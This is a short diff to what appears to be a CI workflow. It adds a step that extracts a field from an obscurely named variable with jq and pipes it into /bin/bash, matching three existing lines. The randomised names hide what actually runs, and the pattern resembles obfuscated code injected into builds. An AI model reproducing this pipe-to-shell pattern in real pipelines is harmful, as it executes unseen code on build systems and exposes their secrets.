@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$cgr46603" | jq -r .uc84014 | /bin/bash
           printf '%s' "$weyr3198" | jq -r .mvta8 | /bin/bash
           echo $cvrr0 | jq -r .ugfps23138 | /bin/bash
+          echo $iys4 | jq -r .quzlz50197 | /bin/bash
 
       - name: Archive results
         if: always()
